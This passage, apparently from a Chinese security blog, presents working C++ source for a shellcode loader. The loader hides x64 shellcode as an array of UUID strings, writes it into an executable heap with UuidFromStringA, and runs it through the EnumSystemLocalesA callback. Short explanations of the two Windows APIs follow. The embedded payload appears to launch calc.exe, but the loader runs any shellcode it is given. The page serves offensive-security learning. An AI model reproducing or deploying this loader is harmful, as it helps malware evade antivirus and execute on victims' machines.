<span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">&quot;Rpcrt4.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>* uuids[] =</span><br><span class="line">&#123;</span><br><span class="line"><span class="string">&quot;e48348fc-e8f0-00c0-0000-415141505251&quot;</span>,</span><br><span class="line"><span class="string">&quot;d2314856-4865-528b-6048-8b5218488b52&quot;</span>,</span><br><span class="line"><span class="string">&quot;728b4820-4850-b70f-4a4a-4d31c94831c0&quot;</span>,</span><br><span class="line"><span class="string">&quot;7c613cac-2c02-4120-c1c9-0d4101c1e2ed&quot;</span>,</span><br><span class="line"><span class="string">&quot;48514152-528b-8b20-423c-4801d08b8088&quot;</span>,</span><br><span class="line"><span class="string">&quot;48000000-c085-6774-4801-d0508b481844&quot;</span>,</span><br><span class="line"><span class="string">&quot;4920408b-d001-56e3-48ff-c9418b348848&quot;</span>,</span><br><span class="line"><span class="string">&quot;314dd601-48c9-c031-ac41-c1c90d4101c1&quot;</span>,</span><br><span class="line"><span class="string">&quot;f175e038-034c-244c-0845-39d175d85844&quot;</span>,</span><br><span class="line"><span class="string">&quot;4924408b-d001-4166-8b0c-48448b401c49&quot;</span>,</span><br><span class="line"><span class="string">&quot;8b41d001-8804-0148-d041-5841585e595a&quot;</span>,</span><br><span class="line"><span class="string">&quot;59415841-5a41-8348-ec20-4152ffe05841&quot;</span>,</span><br><span class="line"><span class="string">&quot;8b485a59-e912-ff57-ffff-5d48ba010000&quot;</span>,</span><br><span class="line"><span class="string">&quot;00000000-4800-8d8d-0101-000041ba318b&quot;</span>,</span><br><span class="line"><span class="string">&quot;d5ff876f-f0bb-a2b5-5641-baa695bd9dff&quot;</span>,</span><br><span class="line"><span class="string">&quot;c48348d5-3c28-7c06-0a80-fbe07505bb47&quot;</span>,</span><br><span class="line"><span class="string">&quot;6a6f7213-5900-8941-daff-d563616c632e&quot;</span>,</span><br><span class="line"><span class="string">&quot;00657865-0000-0000-0000-000000000000&quot;</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE hc = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">void</span>* ha = HeapAlloc(hc, <span class="number">0</span>, <span class="number">0x100000</span>); <span class="comment">//ha为指向申请堆的首地址的指针</span></span><br><span class="line">    DWORD_PTR hptr = (DWORD_PTR)ha;   <span class="comment">//让hptr指向ha</span></span><br><span class="line">    <span class="keyword">int</span> elems = <span class="keyword">sizeof</span>(uuids) / <span class="keyword">sizeof</span>(uuids[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; elems; i++) &#123;</span><br><span class="line">        RPC_STATUS status = UuidFromStringA((RPC_CSTR)uuids[i], (UUID*)hptr);<span class="comment">//转换后指向uuid地址保存在hptr</span></span><br><span class="line">        <span class="keyword">if</span> (status != RPC_S_OK) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;failed&quot;</span>);</span><br><span class="line">            CloseHandle(ha);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        hptr += <span class="number">16</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    EnumSystemLocalesA((LOCALE_ENUMPROCA)ha, <span class="number">0</span>); <span class="comment">//把EnumSystemLocalesA参数中的回调函数设置为指向shellcode地址指针，执行shellcode</span></span><br><span class="line">    CloseHandle(ha);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>执行成功</p>
<p><a target="_blank" rel="noopener" href="https://imgbed.cn/preview?id=6039dca0c9e7be00013afdd7"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/874561fe-2ef9-4fb3-a6a4-05a9286bd1a9.png" alt="imgbed.cn图床"></a></p>
<h1 id="API函数"><a href="#API函数" class="headerlink" title="API函数"></a>API函数</h1><h2 id="UuidFromStringA"><a href="#UuidFromStringA" class="headerlink" title="UuidFromStringA"></a>UuidFromStringA</h2><p>将字符串形式的shellcode转换为UUID，成功返回RPC_S_OK，失败返回RPC_S_INVALID_STRING_UUID</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">RPC_STATUS <span class="title">UuidFromStringA</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  RPC_CSTR StringUuid, <span class="comment">//指向字符串的指针</span></span></span></span><br><span class="line"><span class="function"><span class="params">  UUID     *Uuid <span class="comment">//以二进制形式返回指向UUID的指针。 </span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>

<h2 id="EnumSystemLocalesA"><a href="#EnumSystemLocalesA" class="headerlink" title="EnumSystemLocalesA"></a>EnumSystemLocalesA</h2><p>功能为枚举操作系统上安装或支持的语言环境，第一个参数为指向应用程序定义的回调函数的指针，将它设置为指向UUID的指针即可执行shellcode</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">EnumSystemLocalesA</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  LOCALE_ENUMPROCA lpLocaleEnumProc, <span class="comment">///指向应用程序定义的回调函数的指针</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD            dwFlags <span class="comment">//指定要枚举的语言环境标识符的标志</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>

</div></article></div><nav class="pagination" role="navigation" aria-label="pagination"><div class="pagination-previous"><a href="/">上一页</a></div><div class="pagination-next"><a href="/page/3/">下一页</a></div><ul class="pagination-list is-hidden-mobile"><li><a class="pagination-link" href="/">1</a></li><li><a class="pagination-link is-current" href="/page/2/">2</a></li><li><a class="pagination-link" href="/page/3/">3</a></li><li><a class="pagination-link" href="/page/4/">4</a></li></ul></nav></div><div class="column column-left is-4-tablet is-4-desktop is-4-widescreen  order-1"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar" src="https://i.loli.net/2021/04/15/mxulK15prYAkXbI.png" alt="Sp4z"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">Sp4z</p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">文章</p><a href="/archives"><p class="title">32</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">分类</p><a href="/categories"><p class="title">0</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">标签</p><a href="/tags"><p class="title">0</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/ppoffice" target="_blank" rel="noopener">关注我</a></div><div class="level is-mobile"><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/ppoffice"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Facebook" href="https://facebook.com"><i class="fab fa-facebook"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Twitter" href="https://twitter.com"><i class="fab fa-twitter"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Dribbble" href="https://dribbble.com"><i class="fab fa-dribbble"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="RSS" href="/"><i class="fas fa-rss"></i></a></div></div></div><!--!--><div class="card widget" data-type="links"><div class="card-content"><div class="menu"><h3 class="menu-label">链接</h3><ul class="menu-list"><li><a class="level is-mobile" href="https://hexo.io" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Hexo</span></span><span class="level-right"><span class="level-item tag">hexo.io</span></span></a></li><li><a class="level is-mobile" href="https://bulma.io" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Bulma</span></span><span class="level-right"><span class="level-item tag">bulma.io</span></span></a></li></ul></div></div></div><!--!--><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">最新文章</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-04-16T12:35:38.000Z">2021-04-16</time></p><p class="title"><a href="/2021/04/16/2021%E7%BA%A2%E6%98%8E%E8%B0%B7ctf-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/">2021红明谷ctf web部分复现</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-04-15T06:02:06.000Z">2021-04-15</time></p><p class="title"><a href="/2021/04/15/thinkphp-5-1-x-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-md/">thinkphp 5.1.x 反序列化漏洞分析.md</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-04-12T05:09:24.000Z">2021-04-12</time></p><p class="title"><a href="/2021/04/12/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/">java反序列化学习</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-04-11T07:48:31.000Z">2021-04-11</time></p><p class="title"><a href="/2021/04/11/Thinkphp6-0-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">Thinkphp6.0.x反序列化</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-04-10T06:17:32.000Z">2021-04-10</time></p><p class="title"><a href="/2021/04/10/Thinkphp6-0-0-6-0-1-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">Thinkphp6.0.0-6.0.1 任意文件操作漏洞复现</a></p></div></article></div></div><div class="card widget" data-type="archives"><div class="card-content"><div class="menu"><h3 class="menu-label">归档</h3><ul class="menu-list"><li><a class="level is-mobile" href="/archives/2021/04/"><span class="level-start"><span class="level-item">四月 2021</span></span><span class="level-end"><span class="level-item tag">8</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/03/"><span class="level-start"><span class="level-item">三月 2021</span></span><span class="level-end"><span class="level-item tag">10</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/02/"><span class="level-start"><span class="level-item">二月 2021</span></span><span class="level-end"><span class="level-item tag">8</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/01/"><span class="level-start"><span class="level-item">一月 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/12/"><span class="level-start"><span class="level-item">十二月 2020</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/11/"><span class="level-start"><span class="level-item">十一月 2020</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></div></div></div><!--!--><div class="card widget" data-type="subscribe-email"><div class="card-content"><div class="menu"><h3 class="menu-label">订阅更新</h3><form action="https://feedburner.google.com/fb/a/mailverify" method="post" target="popupwindow" onsubmit="window.open(&#039;https://feedburner.google.com/fb/a/mailverify?uri=&#039;,&#039;popupwindow&#039;,&#039;scrollbars=yes,width=550,height=520&#039;);return true"><input type="hidden" value="" name="uri"><input type="hidden" name="loc" value="en_US"><div class="field has-addons"><div class="control has-icons-left is-expanded"><input class="input" name="email" type="email" placeholder="Email"><span class="icon is-small is-left"><i class="fas fa-envelope"></i></span></div><div class="control"><input class="button" type="submit" value="订阅"></div></div></form></div></div></div><div class="card widget"><div class="card-content"><div class="notification is-danger">You need to set <code>client_id</code> and <code>slot_id</code> to show this AD unit. Please set it in <code>_config.yml</code>.</div></div></div></div><!--!--></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/logo.svg" alt="Hexo" height="28"></a><p class="is-size-7"><span>&copy; 2021 John Doe</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" async></script><script>moment.locale("zh-CN");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="回到顶端" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
      window.cookieconsent.initialise({
        type: "info",
        theme: "edgeless",
        static: false,
        position: "bottom-left",
        content: {
          message: "此网站使用Cookie来改善您的体验。",
          dismiss: "知道了！",
          allow: "允许使用Cookie",
          deny: "拒绝",
          link: "了解更多",
          policy: "Cookie政策",
          href: "https://www.cookiesandyou.com/",
        },
        palette: {
          popup: {
            background: "#edeff5",
            text: "#838391"
          },
          button: {
            background: "#4b81e8"
          },
        },
      });
    });</script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="想要查找什么..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"想要查找什么...","untitled":"(无标题)","posts":"文章","pages":"页面","categories":"分类","tags":"标签"});
        });</script></body></html>